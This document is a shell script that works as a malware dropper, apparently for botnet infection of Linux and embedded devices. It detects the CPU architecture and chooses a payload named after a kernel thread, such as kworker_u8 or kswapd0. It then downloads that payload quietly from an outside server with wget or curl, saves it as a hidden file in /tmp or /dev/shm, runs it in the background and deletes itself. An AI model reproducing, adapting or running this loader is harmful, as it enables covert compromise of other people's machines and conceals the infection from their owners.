#!/bin/sh

SRV="http://mrplankton.com:420"

is_le() {
    echo -n I | od -to2 | awk '{print $2; exit}' | grep -q "49"
}

detect_arch() {
    arch=$(uname -m | tr '[:upper:]' '[:lower:]')
    BIN_NAME="ecryptfsd"

    case "$arch" in
        x86_64|amd64|x64|x86-64)            BIN_NAME="kworker_u8" ;;
        i386|i486|i586|i686|i786|x86|ia32)   BIN_NAME="ksoftirqd0" ;;
        armv5*|armv5l*|armv5te*)              BIN_NAME="bioset0" ;;
        armv6*|armv6l*)                       BIN_NAME="kblockd0" ;;
        armv7*|armv7l*|armv8l*|armv8-compat)  BIN_NAME="jbd2_sda1d" ;;
        aarch64|arm64|armv8|armv8a|armv9*)    BIN_NAME="rcuop_0" ;;
        mipsel|mips32el|mips64el|mips64r2el)  BIN_NAME="ecryptfsd" ;;
        mips|mips32|mips64|mips64r2)
            if is_le; then BIN_NAME="ecryptfsd"; else BIN_NAME="kswapd0"; fi ;;
        ppc|powerpc|ppc32|ppc64)              BIN_NAME="devfreq_wq" ;;
        ppc64le)                              BIN_NAME="zswap_shrinkd" ;;
        s390x)                                BIN_NAME="edac_polld" ;;
        riscv64)                              BIN_NAME="cfg80211d" ;;
    esac

    echo "$BIN_NAME"
}

find_writable_dir() {
    for dir in /dev/shm /tmp /var/system /mnt /var/tmp /run /dev; do
        if [ -d "$dir" ] && [ -w "$dir" ]; then
            echo "$dir"
            return 0
        fi
    done
    if [ -w "." ]; then
        echo "."
        return 0
    fi
    return 1
}

BIN_NAME=$(detect_arch)
URL="$SRV/$BIN_NAME"

WRITABLE_DIR=$(find_writable_dir)
if [ -z "$WRITABLE_DIR" ]; then
    exit 1
fi

DST="$WRITABLE_DIR/.$BIN_NAME"

if [ ! -s "$DST" ]; then
    rm -f "$DST"
    wget -qO "$DST" "$URL" 2>/dev/null || curl -sfLo "$DST" "$URL" 2>/dev/null
    if [ ! -s "$DST" ]; then
        rm -f "$DST"
        exit 1
    fi
fi

chmod +x "$DST"
"$DST" > /dev/null 2>&1 &

SELF="$(realpath "$0" 2>/dev/null)"
if [ -n "$SELF" ] && [ -f "$SELF" ] && [ "$SELF" != "/" ]; then
    rm -f "$SELF"
fi

exit 0
